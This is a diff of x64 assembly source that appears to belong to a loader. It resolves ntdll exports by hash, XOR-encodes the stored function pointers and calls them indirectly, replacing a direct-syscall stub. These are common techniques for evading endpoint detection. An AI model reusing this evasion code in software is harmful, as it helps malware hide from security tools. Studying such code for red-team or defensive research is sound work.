@@ -318,10 +318,32 @@ text segment align(16) 'code' read execute ;                                   ;
 ;
 start proc fastcall
     local   dimp:dynimp
-    mov     [dimp].dynimp.ntavm, 0x18 xor random_mask
-    mov     [dimp].dynimp.ntpvm, 0x50 xor random_mask
-    lea     rcx, dimp
-    lea     rdx, [dimp].dynimp.cfw
+    local   @rbx:qword
+    local   @rsi:qword
+    local   @rdi:qword
+    mov     @rbx, rbx
+    mov     @rsi, rsi
+    mov     @rdi, rdi
+    mov     rdi, rcx
+    sethash rcx, hash_ntdll                 ; encoded hash of `ntdll.dll`       ;
+    call    getmod                          ; get module base of ntdll.dll      ;
+    mov     rsi, rax                        ; save ntdll base                   ;
+    mov     rcx, rax                        ; rcx is the module base            ;
+    sethash rdx, hash_ntavm     
+   ;mov     rdx, hash_ntavm                 ; rdx encoded function hash         ;
+    call    getexp                          ; resolve address by hash           ;
+    xor     rax, random_mask                ; encode it                         ;
+    mov     [dimp].dynimp.ntavm, rax        ; store in dynamic import table     ;
+    mov     rcx, rsi                        ; reload ntdll base                 ;
+    sethash rdx, hash_ntpvm
+   ;mov     rdx, hash_ntpvm                 ; NtProtectVirtualMemory hash       ;
+    call    getexp                          ; resolve ntpvm by hash             ;
+    xor     rax, random_mask                ; encode it                         ;
+    mov     [dimp].dynimp.ntpvm, rax        ; store in dynamic import table     ;
+    clobber_regs
+    mov     rbx, @rbx
+    mov     rsi, @rsi                   
+    mov     rdi, @rdi
     call    genstub
     ret   
 start endp
@@ -342,21 +364,13 @@ genstub proc
     mov     r9, max_stub_size
     push    mem_commit or mem_reserve
     push    page_readwrite
-    and     rsp, not 8
-    call    exec_syscall
+    xor     rbx, random_mask
+    call    rbx
     ret
 genstub endp
 
 ; Invoke either a system call export address or raw syscall number from rbx
 ; If this fails inexplicably, check stack alignment
-exec_syscall proc
-    xor     rbx, random_mask
-    mov     r10, rcx
-    mov     eax, ebx
-    syscall
-_done:
-    ret
-exec_syscall ENDP
 
 ; Get the syscall number from an NTDLL export address
 ;
@@ -456,7 +470,7 @@ _done:                                      ;                                   
 getexp endp                                 ;                                   ;
 ; ----------------------------------------- ;                                   ;
 ; Resolve a module base address by hash     ;                                   ;
-getmod proc hash:qword             ;                                   ;
+getmod proc hash:qword                      ;                                   ;
     local   modname[256*2]:byte             ; stack space for module name buf   ;
     local   first:qword                     ; first module entry                ;
     local   curr:qword                      ; current module entry              ;
@@ -489,7 +503,7 @@ _loop:                                      ; loop over modules                 
     call    gethash                         ; get module name hash              ;
     cmp     rax, rdi                        ; match target?                     ;
     je      _match                          ;                                   ;
-    mov     rbx, curr                       ; while current != first            ;
+    mov     rbx, [curr].ldte.moml.fw   ; while current != first            ;
     cmp     rbx, first                      ;                                   ;
     je      _done                           ;                                   ;
     jmp     _loop                           ;                                   ;
